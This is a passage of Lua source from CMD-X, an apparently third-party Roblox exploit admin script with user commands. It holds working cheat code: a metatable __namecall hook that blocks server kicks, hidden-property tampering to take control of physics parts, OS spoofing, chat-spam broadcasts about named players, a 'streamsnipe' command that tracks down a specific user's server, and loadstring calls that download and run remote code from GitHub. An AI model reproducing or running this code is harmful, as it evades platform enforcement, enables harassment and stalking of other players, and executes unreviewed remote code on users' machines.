						cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." was infected by "..plaguename, "All")			
					elseif i == #cmdp:GetPlayers()-3 then 
						randomss = math.random(1,2)
						if randomss == 2 then
							cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("A cure was found for "..plaguename.." RHO says it will be over soon", "All")
							cureFound = true
						else
							cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Roblox begins breaking down as "..plaguename.." infects the majority of the population", "All")
						end
					elseif i == #cmdp:GetPlayers() then 
						if cureFound == false then
							cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Roblox was completely infected by "..plaguename, "All")
						else
							cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Roblox won against "..plaguename, "All")
						end
					else
						if cureFound == false then
							cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." was infected by "..plaguename, "All")
						end
					end
				end
			else
				opx("*","You need 6 plus players!")
			end
		else
			opx("*","You need 2 arguments!")
		end
	end

	function useCommand.removecmd()
		local removingcmd = findCmd(arguments[2])
		if not removingcmd then
			opx("*","Command does not exist!")
			return
		end
		opx("-","Removed command")
		useCommand[removingcmd] = function() wait() end
	end

	function useCommand.removecustomnametag()
		opx("-","Removed any custom name tags")
		for i,v in pairs(cmdlp.Character:GetDescendants()) do
			if v:IsA("BillboardGui") then
				v:Destroy()
			end
		end
	end

	function useCommand.stubby()
		opx("-","You are now stubby")
		cmdlp.Character.RightHand:Destroy()
		cmdlp.Character.LeftHand:Destroy()
		cmdlp.Character.RightFoot:Destroy()
		cmdlp.Character.LeftFoot:Destroy()
	end

	function useCommand.listunanchored()
		opx("-","Listing unanchored parts")
		xUnanchored = ""
		Num = 0
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart" or "UnionOperation") and v.Anchored == false and v:IsDescendantOf(cmdlp.Character) == false then
				xUnanchored = xUnanchored..v.Name..", "
				Num = Num + 1
			end
		end
		xUnanchored = Num.." | "..xUnanchored
		opxL("Unanchored Parts",xUnanchored)
	end

	function useCommand.iq()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				math.randomseed(target.UserId + 24839)
				local iq1 = math.random(1,200)
				opx("-",target.Name.." has "..iq1.." IQ")
				cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(target.Name.." has "..iq1.." IQ","All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.credits()
		opx("-","Opened credits")
		opxL("Credits","Note: Some discords may be out of date due to consistent changing;\
	Owner - "..DevCords[1].." & "..DevCords[2].."\
	Dev - "..DevCords[3].."\
	Thank you to IY for some functions inside CMD-X\
	Thank you to Bannable#5005 for animpack\
	Thank you to 6033#6033 for old-aimbot")
	end

	function useCommand.outputlarger()
		if arguments[2] then
			opxString = getstring(2)
			opx("-","Opened output-larger")
			opxL("Output-Longer",opxString)
		else
			opx("*","2 arguments are required!")
		end
	end

	local funa = false
	function useCommand.freezeunanchored()
		sethiddenproperty = sethiddenproperty or set_hidden_prop
		gethiddenproperty = gethiddenproperty or get_hidden_prop
		if not sethiddenproperty or not gethiddenproperty then
			opx("*","Your exploit does not support this command. There is nothing we can do.")
			return
		end
		opx("-","Froze unanchored parts")
		funa = true
		cmdlp.MaximumSimulationRadius = math.huge
		sethiddenproperty(cmdlp, "SimulationRadius", math.huge)
		local unanchoredparts = {}
		local movers = {}
		for index, part in pairs(workspace:GetDescendants()) do
			if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(cmdlp.Character) == false then
				table.insert(unanchoredparts, part)
				part.Massless = true
				part.CanCollide = false
				if part:FindFirstChildOfClass("BodyPosition") ~= nil then
					part:FindFirstChildOfClass("BodyPosition"):Destroy()
				end
			end
		end
		for index, part in pairs(unanchoredparts) do
			local mover = Instance.new("BodyPosition", part)
			table.insert(movers, mover)
			mover.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
		end
		repeat
			for index, mover in pairs(movers) do
				mover.Position = mover.Position
			end
			wait(.1)
		until funa == false
		cmdlp.MaximumSimulationRadius = 139
		sethiddenproperty(cmdlp, "SimulationRadius", 139)
	end

	function useCommand.thawunanchored()
		opx("-","Thawed unanchored parts")
		funa = false
	end

	function useCommand.massjoindate()
		opx("-","Showing join dates")
		xJD = ""
		for i,v in pairs(cmdp:GetPlayers()) do
			local tbl = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..v.UserId))
			local Created = tbl["created"]:split("T")
			local Created2 = Created[2]:split(".")
			xJD = xJD..v.Name.." joined on: "..Created[1].." "..Created2[1].."\n"
		end
		opxL("Join dates",xJD)
	end

	function useCommand.massage()
		opx("-","Showing ages")
		xAge = ""
		for i,v in pairs(cmdp:GetPlayers()) do 
			local Years = string.split(v.AccountAge/365,".")
			xAge = xAge..v.Name.."(s) account is "..Years[1].." year(s) old or "..v.AccountAge.." day(s) old\n"
		end
		opxL("Account ages",xAge)
	end

	function useCommand.massid()
		opx("-","Showing IDs")
		xID = ""
		for i,v in pairs(cmdp:GetPlayers()) do 
			xID = xID..v.Name.."s User ID is "..v.UserId.."\n"
		end
		opxL("User IDs",xID)
	end

	function useCommand.rejoindiff()
		rejoining = true
		if syn.queue_on_teleport then
			syn.queue_on_teleport('game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()')
		end
		opx("-","Starting rejoin different...")
		local Decision = arguments[2] or "any"
		local GUIDs = {}
		local maxPlayers = 0
		local pagesToSearch = 100
		if Decision == "fast" then pagesToSearch = 5 end
		local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100&cursor="))
		for i = 1,pagesToSearch do
			for i,v in pairs(Http.data) do
				if v.playing ~= v.maxPlayers and v.id ~= game.JobId then
					maxPlayers = v.maxPlayers
					table.insert(GUIDs, {id = v.id, users = v.playing})
				end
			end
			opx("-","Page searched...")
			if Http.nextPageCursor ~= null then Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100&cursor="..Http.nextPageCursor)) else break end
		end
		opx("-","Attempting teleport...")
		if Decision == "any" or Decision == "fast" then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[math.random(1,#GUIDs)].id, cmdlp)
		elseif Decision == "smallest" then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[#GUIDs].id, cmdlp)
		elseif Decision == "largest" then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[1].id, cmdlp)
		else
			opx("*","A valid preset was required!")
		end
		wait(3)
		rejoining = false
	end

	function useCommand.streamsnipe()
		rejoining = true
		if syn.queue_on_teleport then
			syn.queue_on_teleport('game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()')
		end
		if not arguments[3] then
			opx("*","2 arguments are required!")
			return
		end
		local placeid = arguments[3]
		if arguments[3] == "this" then placeid = game.PlaceId end
		local Decision = tonumber(cmdp:GetUserIdFromNameAsync(arguments[2]))
		opx("-","Starting streamsnipe on "..arguments[2].."...")
		local GUIDs = {}
		local maxPlayers = 0
		local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeid.."/servers/Public?sortOrder=Asc&limit=100&cursor="))
		for i = 1,100 do
			for i,v in pairs(Http.data) do
				for x,y in pairs(v.playerIds) do
					if tonumber(y) == Decision then
						userFound = true
						opx("-","Found user! Teleporting...")
						game:GetService("TeleportService"):TeleportToPlaceInstance(placeid, v.id, cmdlp)
						break
					end
				end
				if userFound then break end
			end
			if userFound then break end
			opx("-","Page searched...")
			if Http.nextPageCursor ~= null then Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeid.."/servers/Public?sortOrder=Asc&limit=100&cursor="..Http.nextPageCursor)) else break end
		end
		wait(3)
		opx("*","User not found!")
		rejoining = false
	end

	function useCommand.irltime()
		opx("-","Set time to IRL")
		for i,v in pairs(game:GetService("Lighting"):GetChildren()) do
			if v:IsA("Sky") then v:Destroy() end
		end
		local reg = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(cmdlp)
		local URL = ("https://restcountries.eu/rest/v2/alpha/"..reg)
		local fuck = game:HttpGet(URL)
		local Http = game:GetService("HttpService"):JSONDecode(fuck)
		game:GetService("Lighting").GeographicLatitude = Http.latlng[1]
		while wait(1) do
			game:GetService("Lighting").TimeOfDay = os.date("!*t").hour + 1 ..":"..os.date("!*t").min..":00"
		end
	end

	function useCommand.transparentbubbles()
		if arguments[2] then
			if _G.transbubbles then
				opx("*","Transparent bubbles are already enabled.")
				return
			end
			local Transparency = arguments[2]
			if cmdlp.PlayerGui:FindFirstChild("BubbleChat") then
				_G.transbubbles = cmdlp.PlayerGui:FindFirstChild("BubbleChat").DescendantAdded:connect(function(msg)
					if msg:IsA("ImageLabel") and msg.Name == "ChatBubble" or msg:IsA("ImageLabel") and msg.Name == "ChatBubbleTail" or msg:IsA("ImageLabel") and msg.Name == "SmallTalkBubble" then
						msg.ImageTransparency = Transparency
					end
				end)
			end
			opx("-","Transparent bubbles have been enabled.")
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.untransparentbubbles()
		if not _G.transbubbles then
			opx("*","Transparent bubbles are not enabled.")
		end
		_G.transbubbles:Disconnect()
		_G.transbubbles = nil
		opx("-","Transparent bubbles have been disabled.")
	end

	function useCommand.directjoin()
		if arguments[3] then
			rejoining = true
			if syn.queue_on_teleport then
				syn.queue_on_teleport('game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()')
			end
			opx("-","Joining server")
			if arguments[2] == "this" then arguments[2] = game.PlaceId end
			game:GetService("TeleportService"):TeleportToPlaceInstance(arguments[2],arguments[3],cmdlp)
			wait(3)
			rejoining = false
		else
			opx("*","3 arguments are required!")
		end
	end

	pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/depthoffield.lua",true))() end)
	-- Thanks to MrAsyncRoblox on github, full credits.

	function useCommand.timedcmd()
		if arguments[3] then
			opx("-","Executing command after time given")
			local newarguments = getstring(3)
			wait(arguments[2])
			arguments = newarguments:split(" ")
			useCommand[arguments[1]]()
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.depth()
		DynamicDepth:Enable()
		if arguments[2] then
			opx("-","Set DepthOfField to "..arguments[2])
			DynamicDepth:SetFocusRadius(arguments[2])
		else
			opx("-","Set DepthOfField to 15")
			DynamicDepth:SetFocusRadius(15)
		end
	end

	function useCommand.undepth()
		opx("-","Disabled DepthOfField")
		DynamicDepth:SetFocusRadius(10000)
	end

	function useCommand.cinematic()
		game:GetService("CoreGui").TopBar.Enabled = false
		game:GetService("CoreGui").RobloxGui.Backpack.Visible = false
		game:GetService("CoreGui").RobloxGui.PlayerListMaster.Visible = false
		opx("-","Enabled cinematic mode")
	end

	function useCommand.uncinematic()
		game:GetService("CoreGui").TopBar.Enabled = true
		game:GetService("CoreGui").RobloxGui.Backpack.Visible = true
		game:GetService("CoreGui").RobloxGui.PlayerListMaster.Visible = true
		opx("-","Disabled cinematic mode")
	end
	-- freecam by roblox ty roblox lol
	pi    = math.pi
	abs   = math.abs
	clamp = math.clamp
	exp   = math.exp
	rad   = math.rad
	sign  = math.sign
	sqrt  = math.sqrt
	tan   = math.tan

	ContextActionService = game:GetService("ContextActionService")
	Players = cmdp
	RunService = game:GetService("RunService")
	StarterGui = game:GetService("StarterGui")
	Workspace = workspace

	LocalPlayer = cmdlp
	if not LocalPlayer then
		Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
		LocalPlayer = cmdlp
	end

	Camera = Workspace.CurrentCamera
	Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
		local newCamera = Workspace.CurrentCamera
		if newCamera then
			Camera = newCamera
		end
	end)

	TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
	INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
	FREECAM_MACRO_KB = {Enum.KeyCode.LeftShift, Enum.KeyCode.P}

	NAV_GAIN = Vector3.new(1, 1, 1)*64
	PAN_GAIN = Vector2.new(0.75, 1)*8
	FOV_GAIN = 300

	PITCH_LIMIT = rad(90)

	VEL_STIFFNESS = 1.5
	PAN_STIFFNESS = 1.0
	FOV_STIFFNESS = 4.0

	Spring = {} do
		Spring.__index = Spring

		function Spring.new(freq, pos)
			local self = setmetatable({}, Spring)
			self.f = freq
			self.p = pos
			self.v = pos*0
			return self
		end

		function Spring:Update(dt, goal)
			local f = self.f*2*pi
			local p0 = self.p
			local v0 = self.v

			local offset = goal - p0
			local decay = exp(-f*dt)

			local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
			local v1 = (f*dt*(offset*f - v0) + v0)*decay

			self.p = p1
			self.v = v1

			return p1
		end

		function Spring:Reset(pos)
			self.p = pos
			self.v = pos*0
		end
	end

	cameraPos = Vector3.new()
	cameraRot = Vector2.new()
	cameraFov = 0

	velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
	panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
	fovSpring = Spring.new(FOV_STIFFNESS, 0)

	Input = {} do
		local thumbstickCurve do
			K_CURVATURE = 2.0
			K_DEADZONE = 0.15

			function fCurve(x)
				return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
			end

			function fDeadzone(x)
				return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
			end

			function thumbstickCurve(x)
				return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
			end
		end

		gamepad = {
			ButtonX = 0,
			ButtonY = 0,
			DPadDown = 0,
			DPadUp = 0,
			ButtonL2 = 0,
			ButtonR2 = 0,
			Thumbstick1 = Vector2.new(),
			Thumbstick2 = Vector2.new(),
		}

		keyboard = {
			W = 0,
			A = 0,
			S = 0,
			D = 0,
			E = 0,
			Q = 0,
			U = 0,
			H = 0,
			J = 0,
			K = 0,
			I = 0,
			Y = 0,
			Up = 0,
			Down = 0,
			LeftShift = 0,
			RightShift = 0,
		}

		mouse = {
			Delta = Vector2.new(),
			MouseWheel = 0,
		}

		NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
		NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
		PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
		PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
		FOV_WHEEL_SPEED    = 1.0
		FOV_GAMEPAD_SPEED  = 0.25
		NAV_ADJ_SPEED      = 0.75
		NAV_SHIFT_MUL      = 0.25

		navSpeed = 1

		function Input.Vel(dt)
			navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

			kGamepad = Vector3.new(
				thumbstickCurve(gamepad.Thumbstick1.x),
				thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
				thumbstickCurve(-gamepad.Thumbstick1.y)
			)*NAV_GAMEPAD_SPEED

			kKeyboard = Vector3.new(
				keyboard.D - keyboard.A + keyboard.K - keyboard.H,
				keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
				keyboard.S - keyboard.W + keyboard.J - keyboard.U
			)*NAV_KEYBOARD_SPEED

			shift = cmduis:IsKeyDown(Enum.KeyCode.LeftShift) or cmduis:IsKeyDown(Enum.KeyCode.RightShift)

			return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
		end

		function Input.Pan(dt)
			kGamepad = Vector2.new(
				thumbstickCurve(gamepad.Thumbstick2.y),
				thumbstickCurve(-gamepad.Thumbstick2.x)
			)*PAN_GAMEPAD_SPEED
			kMouse = mouse.Delta*PAN_MOUSE_SPEED
			mouse.Delta = Vector2.new()
			return kGamepad + kMouse
		end

		function Input.Fov(dt)
			kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
			kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
			mouse.MouseWheel = 0
			return kGamepad + kMouse
		end

		do
			function Keypress(action, state, input)
				keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
				return Enum.ContextActionResult.Sink
			end

			function GpButton(action, state, input)
				gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
				return Enum.ContextActionResult.Sink
			end

			function MousePan(action, state, input)
				delta = input.Delta
				mouse.Delta = Vector2.new(-delta.y, -delta.x)
				return Enum.ContextActionResult.Sink
			end

			function Thumb(action, state, input)
				gamepad[input.KeyCode.Name] = input.Position
				return Enum.ContextActionResult.Sink
			end

			function Trigger(action, state, input)
				gamepad[input.KeyCode.Name] = input.Position.z
				return Enum.ContextActionResult.Sink
			end

			function MouseWheel(action, state, input)
				mouse[input.UserInputType.Name] = -input.Position.z
				return Enum.ContextActionResult.Sink
			end

			function Zero(t)
				for k, v in pairs(t) do
					t[k] = v*0
				end
			end

			function Input.StartCapture()
				ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
					Enum.KeyCode.W, Enum.KeyCode.U,
					Enum.KeyCode.A, Enum.KeyCode.H,
					Enum.KeyCode.S, Enum.KeyCode.J,
					Enum.KeyCode.D, Enum.KeyCode.K,
					Enum.KeyCode.E, Enum.KeyCode.I,
					Enum.KeyCode.Q, Enum.KeyCode.Y,
					Enum.KeyCode.Up, Enum.KeyCode.Down
				)
				ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
				ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
				ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
				ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
				ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
			end

			function Input.StopCapture()
				navSpeed = 1
				Zero(gamepad)
				Zero(keyboard)
				Zero(mouse)
				ContextActionService:UnbindAction("FreecamKeyboard")
				ContextActionService:UnbindAction("FreecamMousePan")
				ContextActionService:UnbindAction("FreecamMouseWheel")
				ContextActionService:UnbindAction("FreecamGamepadButton")
				ContextActionService:UnbindAction("FreecamGamepadTrigger")
				ContextActionService:UnbindAction("FreecamGamepadThumbstick")
			end
		end
	end

	function GetFocusDistance(cameraFrame)
		local znear = 0.1
		local viewport = Camera.ViewportSize
		local projy = 2*tan(cameraFov/2)
		local projx = viewport.x/viewport.y*projy
		local fx = cameraFrame.rightVector
		local fy = cameraFrame.upVector
		local fz = cameraFrame.lookVector

		local minVect = Vector3.new()
		local minDist = 512

		for x = 0, 1, 0.5 do
			for y = 0, 1, 0.5 do
				local cx = (x - 0.5)*projx
				local cy = (y - 0.5)*projy
				local offset = fx*cx - fy*cy + fz
				local origin = cameraFrame.p + offset*znear
				local _, hit = Workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
				local dist = (hit - origin).magnitude
				if minDist > dist then
					minDist = dist
					minVect = offset.unit
				end
			end
		end
		return fz:Dot(minVect)*minDist
	end

	local function StepFreecam(dt)
		local vel = velSpring:Update(dt, Input.Vel(dt))
		local pan = panSpring:Update(dt, Input.Pan(dt))
		local fov = fovSpring:Update(dt, Input.Fov(dt))

		local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))

		cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
		cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
		cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))

		local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
		cameraPos = cameraCFrame.p

		Camera.CFrame = cameraCFrame
		Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
		Camera.FieldOfView = cameraFov
	end

	local PlayerState = {} do
		mouseBehavior = ""
		mouseIconEnabled = ""
		cameraType = ""
		cameraFocus = ""
		cameraCFrame = ""
		cameraFieldOfView =  ""
		screenGuis = {}

		function PlayerState.Push()
			cameraFieldOfView = Camera.FieldOfView
			Camera.FieldOfView = 70

			cameraType = Camera.CameraType
			Camera.CameraType = Enum.CameraType.Custom

			cameraCFrame = Camera.CFrame
			cameraFocus = Camera.Focus

			mouseIconEnabled = cmduis.MouseIconEnabled
			cmduis.MouseIconEnabled = true

			mouseBehavior = cmduis.MouseBehavior
			cmduis.MouseBehavior = Enum.MouseBehavior.Default
		end

		function PlayerState.Pop()
			Camera.FieldOfView = 70

			Camera.CameraType = cameraType
			cameraType = nil

			Camera.CFrame = cameraCFrame
			cameraCFrame = nil

			Camera.Focus = cameraFocus
			cameraFocus = nil

			cmduis.MouseIconEnabled = mouseIconEnabled
			mouseIconEnabled = nil

			cmduis.MouseBehavior = mouseBehavior
			mouseBehavior = nil
		end
	end

	function StartFreecam(p)
		local cameraCFrame = Camera.CFrame
		if p then
			cameraCFrame = p
		end
		cameraRot = Vector2.new()
		cameraPos = cameraCFrame.p
		cameraFov = Camera.FieldOfView

		velSpring:Reset(Vector3.new())
		panSpring:Reset(Vector2.new())
		fovSpring:Reset(0)

		PlayerState.Push()
		RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
		Input.StartCapture()
	end

	function StopFreecam()
		Input.StopCapture()
		RunService:UnbindFromRenderStep("Freecam")
		PlayerState.Pop()
		workspace.Camera.FieldOfView = 70
	end

	FreecamOn = false
	function useCommand.freecam()
		opx("-","Activated freecam")
		StartFreecam()
		wait(.1)
		navSpeed = permfcspeed
		FreecamOn = true
		NAV_KEYBOARD_SPEED = Vector3.new(permfcspeed, permfcspeed, permfcspeed)
	end

	function useCommand.freecamspeed()
		if cmdnum(arguments[2]) then
			opx("-","Freecam speed set to "..arguments[2])
			navSpeed = arguments[2]
			NAV_KEYBOARD_SPEED = Vector3.new(arguments[2], arguments[2], arguments[2])
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.permfreecamspeed()
		if cmdnum(arguments[2]) then
			opx("-","Set perm free cam speed")
			permfcspeed = arguments[2]
			updatesaves()
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.unfreecam()
		opx("-","De-Activated freecam")
		StopFreecam()
		FreecamOn = false
		wait(1)
		workspace.Camera.FieldOfView = 70
	end

	function useCommand.freecamgoto()
		if FreecamOn then
			if arguments[2] then
				local target = findplr(arguments[2])
				if target then
					StopFreecam()
					wait(.1)
					opx("-","Teleported freecam to "..target.Name)
					StartFreecam(target.Character.HumanoidRootPart.CFrame)
					navSpeed = permfcspeed
					NAV_KEYBOARD_SPEED = Vector3.new(permfcspeed, permfcspeed, permfcspeed)
				else
					opx("*","Player does not exist!")
				end
			else
				opx("*","2 arguments are required!")
			end
		else
			opx("*","Freecam isnt running!")
		end
	end

	function useCommand.freecamfreegoto()
		if FreecamOn then
			if arguments[4] then
				StopFreecam()
				wait(.1)
				opx("-","Teleported freecam to pos")
				StartFreecam(arguments[2],arguments[3],arguments[4])
				navSpeed = permfcspeed
				NAV_KEYBOARD_SPEED = Vector3.new(permfcspeed, permfcspeed, permfcspeed)
			else
				opx("*","2 arguments are required!")
			end
		else
			opx("*","Freecam isnt running!")
		end
	end

	function useCommand.freecamloadpos()
		if FreecamOn then
			if arguments[2] then
				StopFreecam()
				wait(.1)
				wpNS = getstring(2)
				for i,v in pairs(WPs) do
					local xc = WPs[i].C[1]
					local yc = WPs[i].C[2]
					local zc = WPs[i].C[3]
					if tostring(WPs[i].N) == tostring(wpNS) then
						StartFreecam(xc,yc,zc)
						navSpeed = permfcspeed
						NAV_KEYBOARD_SPEED = Vector3.new(permfcspeed, permfcspeed, permfcspeed)
					end
				end
				opx("Teleported to "..tostring(wpNS))
			else
				opx("*","2 arguments are needed for this command!")
			end
		else
			opx("*","Freecam isnt running!")
		end
	end

	function useCommand.freecamgotopart()
		if FreecamOn then
			if arguments[2] then
				StopFreecam()
				wait(.1)
				opx("-","Teleported freecam to part")
				for i,v in pairs(workspace:GetDescendants()) do
					if v.Name == getstring(2) then
						StartFreecam(v.CFrame)
						navSpeed = permfcspeed
						NAV_KEYBOARD_SPEED = Vector3.new(permfcspeed, permfcspeed, permfcspeed)
						break
					end
				end
			else
				opx("*","2 arguments are required!")
			end
		else
			opx("*","Freecam isnt running!")
		end
	end

	function useCommand.freecamgotoclass()
		if FreecamOn then
			if arguments[2] then
				StopFreecam()
				wait(.1)
				opx("-","Teleported freecam to class")
				for i,v in pairs(workspace:GetDescendants()) do
					if v.ClassName == getstring(2) then
						StartFreecam(v.CFrame)
						navSpeed = permfcspeed
						NAV_KEYBOARD_SPEED = Vector3.new(permfcspeed, permfcspeed, permfcspeed)
						break
					else
						opx("*","Part does not exist")
					end
				end
			else
				opx("*","2 arguments are required!")
			end
		else
			opx("*","Freecam isnt running!")
		end
	end

	function useCommand.spotify()
		opx("-","Spotify Premium is needed to run Spotify Presence")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/projects/spotify.lua"))()
	end

	function useCommand.friendjoin()
		rejoining = true
		if arguments[2] then
			opx("-","Scanning friends, this may take some time")
			local target = findplr(arguments[2], cmdlp:GetFriendsOnline())
			if target then
				if target.LastLocation then
					if syn.queue_on_teleport then
						syn.queue_on_teleport('game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()')
					end
					opx("-","Joining friend")
					game:GetService("TeleportService"):TeleportToPlaceInstance(target.PlaceId, target.GameId, cmdlp)
				else
					opx("*","Friend isnt in a game!")
				end
			end
			opx("*","Friend dosent exist!")
		else
			opx("*","2 arguments are required!")
		end
		wait(3)
		rejoining = false
	end

	function useCommand.hotkeynoclip()
		if arguments[2] then
			opx("-","Added key to noclip")
			hotkeynoclip = arguments[2]
			updatesaves()
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.spoofos()
		if arguments[2] then
			opx("-","Spoofed OS to "..getstring(2))
			cmdlp.OsPlatform = getstring(2)
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.noshow()
		if arguments[2] == "on" then
			opx("-","No-Show is now on")
			opx("-","Make sure to reset your character!")
			sDetect = false
			updatesaves()
		elseif arguments[2] == "off" then
			opx("-","No-Show is now off")
			opx("-","Make sure to reset your character!")
			sDetect = true
			updatesaves()
		else
			opx("*","A valid preset is needed!")
		end
	end

	function useCommand.players()
		opx("Listed players in game")
		xPlayers = #cmdp:GetPlayers().." | "
		for i,v in pairs(cmdp:GetPlayers()) do
			xPlayers = xPlayers..v.Name..", "
		end
		opxL("Players",xPlayers)
	end

	function useCommand.viewserver()
		if not arguments[3] then
			opx("*","3 arguments are required!")
			return
		end
		local xPlayers = ""
		local placeid,guid = arguments[2],arguments[3]
		local serverFound = false
		if arguments[2] == "this" then placeid = game.PlaceId end
		local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeid.."/servers/Public?sortOrder=Asc&limit=100&cursor="))
		for i = 1,100 do
			for i,v in pairs(Http.data) do
				if v.id ~= guid then
					serverFound = true
					for x,y in pairs(v.playerIds) do
						xPlayers = xPlayers..cmdp:GetNameFromUserIdAsync(y)..", "
					end
					break
				end
				if serverFound then break end
			end
			if serverFound then break end
			if Http.nextPageCursor ~= null then Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeid.."/servers/Public?sortOrder=Asc&limit=100&cursor="..Http.nextPageCursor)) else break end
		end
		opx("-","Listed all players in "..guid)
		opxL("Players "..guid,xPlayers)
	end

	function useCommand.servers()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		local placeid = arguments[2]
		if arguments[2] == "this" then
			placeid = game.PlaceId
		end
		local xServers = ""
		local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeid.."/servers/Public?sortOrder=Asc&limit=100&cursor="))
		for i = 1,100 do
			for i,v in pairs(Http.data) do
				xServers = xServers..v.playing.."/"..v.maxPlayers.." {"..v.id.."}".."\n"
			end
			opx("-","Page searched...")
			if Http.nextPageCursor then
				Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeid.."/servers/Public?sortOrder=Asc&limit=100&cursor="..Http.nextPageCursor))
			else
				break
			end
		end
		opx("-","Listed all servers")
		opxL("Servers",xServers)
	end
	function useCommand.antikick()
		opx("-","Anti-Kick enabled")
		local ncallsa = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(...)
			local args = {...}
			if not checkcaller() and getnamecallmethod() == "Kick" then
				return nil
			end
			return ncallsa(...)
		end)
		setreadonly(mt, true)
	end

	function useCommand.cmdinfo()
		local cmdinfo = {}
		if CMDS.commands[arguments[2]] then
			cmdinfo.description = CMDS.commands[findCmd(arguments[2])]
			cmdinfo.name = findCmd(arguments[2])
			cmdinfo.usage = CMDS.usage[findCmd(arguments[2])]
